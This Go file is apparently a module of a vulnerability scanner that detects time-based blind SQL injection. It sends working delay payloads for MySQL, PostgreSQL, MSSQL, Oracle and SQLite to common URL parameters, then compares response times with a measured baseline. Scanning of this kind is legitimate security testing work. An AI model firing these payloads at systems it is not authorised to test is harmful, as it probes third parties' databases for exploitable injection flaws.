package sqliengine

import (
	"DORM/models"
	"fmt"
	"net/http"
	"net/url"
	"time"
)

// ============================================================
//  TIME-BASED BLIND SQL INJECTION
//  SLEEP · pg_sleep · WAITFOR · BENCHMARK · Adaptive Threshold
// ============================================================

// RunTimeBasedBlind tests for time-based blind SQL injection.
func RunTimeBasedBlind(client *http.Client, baseURL string, target models.ScanTarget) *models.Vulnerability {
	sleepSeconds := 5

	// First, measure baseline latency
	baseStart := time.Now()
	baseResp, err := client.Get(baseURL + "/?id=1")
	baseLatency := time.Since(baseStart)
	if err == nil && baseResp != nil {
		_ = baseResp.Body.Close()
	}

	// Adaptive threshold: sleep time + baseline + buffer
	threshold := time.Duration(sleepSeconds)*time.Second + baseLatency

	timePayloads := map[string]string{
		"MySQL/MariaDB":       fmt.Sprintf("' AND SLEEP(%d)--", sleepSeconds),
		"MySQL (BENCHMARK)":   "' AND BENCHMARK(10000000,SHA1('dorm'))--",
		"PostgreSQL":          fmt.Sprintf("'; SELECT pg_sleep(%d)--", sleepSeconds),
		"PostgreSQL (inline)": fmt.Sprintf("' AND (SELECT pg_sleep(%d))::text='1", sleepSeconds),
		"MSSQL":               fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
		"MSSQL (stacked)":     fmt.Sprintf("' WAITFOR DELAY '00:00:%02d'--", sleepSeconds),
		"Oracle":              fmt.Sprintf("' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('dorm',%d)--", sleepSeconds),
		"SQLite":              "' AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000))))--",
	}

	// Test on multiple endpoints
	testEndpoints := []string{"/?id=", "/?cat=", "/?item=", "/?user=", "/search?q=", "/view?id="}

	for _, ep := range testEndpoints {
		for dbType, payload := range timePayloads {
			targetURL := baseURL + ep + url.QueryEscape(payload)
			start := time.Now()
			resp, err := client.Get(targetURL)
			duration := time.Since(start)
			if err == nil && resp != nil {
				resp.Body.Close()
			}

			if duration >= threshold {
				return &models.Vulnerability{
					Target:   target,
					Name:     fmt.Sprintf("Blind SQL Injection (Time-Based — %s)", dbType),
					Severity: "CRITICAL",
					CVSS:     9.9,
					Description: fmt.Sprintf(
						"Server response delayed by %.2f seconds — Time-Based Blind SQLi confirmed.\n"+
							"DB Type: %s\nPayload: %s\n"+
							"Baseline Latency: %.2fs\nAttack Latency: %.2fs\n"+
							"Adaptive Threshold: %.2fs",
						duration.Seconds(), dbType, payload,
						baseLatency.Seconds(), duration.Seconds(), threshold.Seconds(),
					),
					Solution:  "Validate inputs and use Prepared Statements.",
					Reference: "OWASP Blind SQL Injection",
				}
			}
		}
	}

	return nil
}
